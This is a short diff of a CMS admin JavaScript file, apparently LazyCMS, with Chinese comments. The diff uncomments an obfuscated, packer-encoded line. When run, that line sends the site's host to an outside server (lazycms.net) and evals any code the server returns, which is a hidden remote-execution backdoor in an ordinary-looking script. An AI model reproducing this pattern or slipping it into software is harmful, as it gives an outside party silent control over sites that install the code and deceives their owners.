@@ -23,7 +23,7 @@ $(document).ready(function(){
         if (lastVersion>localVersion) { if (typeof d.code!='undefined') { eval(d.code); } }
     });
 	*/
-    //eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.6("7://8.9.c/e/f.h?0="+i.j.0+"&k=?",l(d){1 a=$(\'#2 m\').n().3(/\\./g,\'\');1 b=d.2.3(/\\./g,\'\');4(b>a){4(o d.5!=\'p\'){q(d.5)}}});',27,27,'host|var|version|replace|if|code|getJSON|http|www|lazycms|||net||ver|index||php|self|location|callback|function|span|text|typeof|undefined|eval'.split('|'),0,{}));
+    eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.6("7://8.9.c/e/f.h?0="+i.j.0+"&k=?",l(d){1 a=$(\'#2 m\').n().3(/\\./g,\'\');1 b=d.2.3(/\\./g,\'\');4(b>a){4(o d.5!=\'p\'){q(d.5)}}});',27,27,'host|var|version|replace|if|code|getJSON|http|www|lazycms|||net||ver|index||php|self|location|callback|function|span|text|typeof|undefined|eval'.split('|'),0,{}));
 	
 	// 点击顶部菜单隐藏快捷方式
 	$('#menu li a').click(function(){
